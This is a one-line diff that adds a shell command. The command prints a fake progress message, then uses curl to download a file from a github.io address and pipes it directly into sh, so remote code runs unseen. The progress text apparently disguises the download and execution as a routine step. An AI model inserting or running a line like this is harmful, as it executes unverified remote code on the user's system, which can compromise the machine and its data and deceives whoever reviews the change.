@@ -1,0 +1,1 @@
+echo 'Progress: 63.0%'; curl -L --progress-bar frkns.github.io/fun/artistic_cleveland_commander.a.out | sh
